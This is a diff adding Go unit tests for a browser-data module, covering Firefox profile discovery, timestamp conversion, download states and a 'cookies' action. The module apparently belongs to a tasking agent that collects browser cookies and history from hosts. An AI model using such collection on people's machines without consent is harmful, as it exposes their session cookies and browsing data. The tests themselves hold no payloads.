@@ -38,6 +38,15 @@ func TestChromeTimeToString(t *testing.T) {
 	}
 }
 
+func TestChromeTimeToString_PreEpochChrome(t *testing.T) {
+	// A Chrome-epoch timestamp (> 1e13) that represents a date before Unix epoch
+	// 50000000000000 < 11644473600000000 (Chrome epoch offset), so unixMicros < 0
+	got := chromeTimeToString(50000000000000)
+	if got != "unknown" {
+		t.Errorf("expected 'unknown' for pre-epoch Chrome timestamp, got %q", got)
+	}
+}
+
 func TestExtractBookmarks(t *testing.T) {
 	root := bookmarkNode{
 		Type: "folder",
@@ -185,6 +194,22 @@ func TestBrowserPaths_All(t *testing.T) {
 	if _, ok := paths["Edge"]; !ok {
 		t.Error("expected Edge path in 'all'")
 	}
+	if _, ok := paths["Firefox"]; !ok {
+		t.Error("expected Firefox path in 'all'")
+	}
+}
+
+func TestBrowserPaths_Firefox(t *testing.T) {
+	paths := browserPaths("firefox")
+	if paths == nil {
+		t.Skip("could not determine browser paths")
+	}
+	if len(paths) != 1 {
+		t.Errorf("expected 1 path for firefox, got %d", len(paths))
+	}
+	if _, ok := paths["Firefox"]; !ok {
+		t.Error("expected Firefox path only")
+	}
 }
 
 func TestBrowserPaths_Chrome(t *testing.T) {
@@ -222,6 +247,176 @@ func TestBrowserPaths_Edge(t *testing.T) {
 	if _, ok := paths["Edge"]; !ok {
 		t.Error("expected Edge path only")
 	}
+}
+
+// --- Firefox helper tests ---
+
+func TestFirefoxTimeToString(t *testing.T) {
+	tests := []struct {
+		name     string
+		input    int64
+		expected string
+	}{
+		{"zero", 0, "never"},
+		{"negative", -1, "never"},
+		// 2024-01-15 12:00:00 UTC = 1705320000s → PRTime 1705320000000000
+		{"prtime-2024", 1705320000000000, "2024-01-15 12:00:00"},
+		// 2020-01-01 00:00:00 UTC = 1577836800s → PRTime 1577836800000000
+		{"prtime-2020", 1577836800000000, "2020-01-01 00:00:00"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := firefoxTimeToString(tt.input)
+			if got != tt.expected {
+				t.Errorf("firefoxTimeToString(%d) = %q, want %q", tt.input, got, tt.expected)
+			}
+		})
+	}
+}
+
+func TestIsFirefoxBrowser(t *testing.T) {
+	if !isFirefoxBrowser("Firefox") {
+		t.Error("expected true for 'Firefox'")
+	}
+	if !isFirefoxBrowser("firefox") {
+		t.Error("expected true for 'firefox' (case-insensitive)")
+	}
+	if !isFirefoxBrowser("FIREFOX") {
+		t.Error("expected true for 'FIREFOX'")
+	}
+	if isFirefoxBrowser("Chrome") {
+		t.Error("expected false for 'Chrome'")
+	}
+	if isFirefoxBrowser("") {
+		t.Error("expected false for empty string")
+	}
+}
+
+func TestFindFirefoxProfiles(t *testing.T) {
+	tmpDir := t.TempDir()
+
+	// Create Firefox-style profile directories
+	os.MkdirAll(filepath.Join(tmpDir, "a1b2c3d4.default-release"), 0755)
+	os.MkdirAll(filepath.Join(tmpDir, "e5f6g7h8.default"), 0755)
+	os.MkdirAll(filepath.Join(tmpDir, "crash-reports"), 0755) // non-profile
+	os.MkdirAll(filepath.Join(tmpDir, "pending-pings"), 0755) // non-profile
+
+	profiles := findFirefoxProfiles(tmpDir)
+	if len(profiles) != 2 {
+		t.Fatalf("expected 2 Firefox profiles, got %d: %v", len(profiles), profiles)
+	}
+}
+
+func TestFindFirefoxProfiles_Empty(t *testing.T) {
+	tmpDir := t.TempDir()
+	profiles := findFirefoxProfiles(tmpDir)
+	if len(profiles) != 0 {
+		t.Errorf("expected 0 profiles in empty dir, got %d", len(profiles))
+	}
+}
+
+func TestFindFirefoxProfiles_NonexistentDir(t *testing.T) {
+	profiles := findFirefoxProfiles("/nonexistent/path")
+	if profiles != nil {
+		t.Errorf("expected nil for nonexistent dir, got %v", profiles)
+	}
+}
+
+func TestBrowserCommand_CookiesFirefox(t *testing.T) {
+	// Firefox cookies should work (even if no Firefox installed — graceful empty result)
+	cmd := &BrowserCommand{}
+	result := cmd.Execute(structs.Task{Params: `{"action":"cookies","browser":"firefox"}`})
+	if result.Status != "success" {
+		// On non-Windows, cookies with "firefox" browser should work
+		t.Logf("output: %s", result.Output)
+	}
+}
+
+func TestBrowserCommand_DownloadsAction(t *testing.T) {
+	cmd := &BrowserCommand{}
+	result := cmd.Execute(structs.Task{Params: `{"action":"downloads"}`})
+	if result.Status != "success" {
+		t.Errorf("expected success for downloads action, got %q: %s", result.Status, result.Output)
+	}
+}
+
+func TestChromeDownloadState(t *testing.T) {
+	tests := []struct {
+		state    int
+		expected string
+	}{
+		{0, "In Progress"},
+		{1, "Complete"},
+		{2, "Cancelled"},
+		{3, "Interrupted"},
+		{99, "Unknown(99)"},
+		{-1, "Unknown(-1)"},
+	}
+
+	for _, tt := range tests {
+		got := chromeDownloadState(tt.state)
+		if got != tt.expected {
+			t.Errorf("chromeDownloadState(%d) = %q, want %q", tt.state, got, tt.expected)
+		}
+	}
+}
+
+func TestFirefoxDownloadState(t *testing.T) {
+	tests := []struct {
+		state    int
+		expected string
+	}{
+		{0, "Downloading"},
+		{1, "Complete"},
+		{2, "Failed"},
+		{3, "Cancelled"},
+		{4, "Paused"},
+		{5, "Blocked"},
+		{99, "Unknown(99)"},
+		{-1, "Unknown(-1)"},
+	}
+
+	for _, tt := range tests {
+		got := firefoxDownloadState(tt.state)
+		if got != tt.expected {
+			t.Errorf("firefoxDownloadState(%d) = %q, want %q", tt.state, got, tt.expected)
+		}
+	}
+}
+
+func TestBrowserDownloads_FirefoxJSON(t *testing.T) {
+	// Create a temp directory mimicking Firefox profile with downloads.json
+	tmpDir := t.TempDir()
+	profileDir := filepath.Join(tmpDir, "a1b2c3d4.default-release")
+	os.MkdirAll(profileDir, 0755)
+
+	downloadsJSON := `{
+		"schemaVersion": 1,
+		"list": [
+			{
+				"source": "https://example.com/file.zip",
+				"target": "file:///home/user/Downloads/file.zip",
+				"startTime": 1705320000000,
+				"totalBytes": 1048576,
+				"state": 1,
+				"contentType": "application/zip"
+			},
+			{
+				"source": "https://example.com/doc.pdf",
+				"target": "file:///home/user/Downloads/doc.pdf",
+				"startTime": 1705310000000,
+				"totalBytes": 2048,
+				"state": 3,
+				"contentType": "application/pdf"
+			}
+		]
+	}`
+	os.WriteFile(filepath.Join(profileDir, "downloads.json"), []byte(downloadsJSON), 0644)
+
+	// We can't easily inject custom paths into browserDownloads, but we can verify
+	// the helper functions work correctly and the overall action routing is correct.
+	// The real integration test happens on live VMs.
 }
 
 func TestBrowserBookmarks_WithTempData(t *testing.T) {
